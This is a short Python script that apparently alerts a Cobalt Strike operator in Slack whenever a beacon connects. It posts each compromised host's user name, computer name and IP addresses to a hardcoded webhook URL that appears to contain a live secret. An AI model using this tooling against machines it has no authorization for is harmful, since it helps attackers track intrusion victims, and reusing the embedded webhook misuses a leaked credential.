#! /usr/bin/env python
# slacknotification.py

import argparse
import slackweb
import socket
import datetime

parser = argparse.ArgumentParser(description='beacon info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--externalip')
parser.add_argument('--username')
parser.add_argument('--channel', default='#general', help='Slack channel to send the notification')
parser.add_argument('--color', default='#36a64f', help='Color bar for the notification')
parser.add_argument('--title', default='Beacon Initiated', help='Title for the notification')

hostname = socket.gethostname()

args = parser.parse_args()

slackUrl = "https://hooks.slack.com/services/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"  # Your Slack webhook URL
computername = args.computername
internalip = args.internalip
externalip = args.externalip
user = args.username
username = 'Cobalt Strike Bot'
channel = '#alert-cobaltstrike'
color = args.color
title = 'Beacon Connected'
timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

slack = slackweb.Slack(url=slackUrl)
message = "```Computer User : {}\nComputer Name: {}\nInternal IP: {}\nExternal IP: {}\nTimestamp : {}```".format(user, computername, internalip, externalip, timestamp)

attachment = {
    "title": title,
    "text": message,
    "color": color
}

slack.notify(attachments=[attachment], channel=channel, username=username)
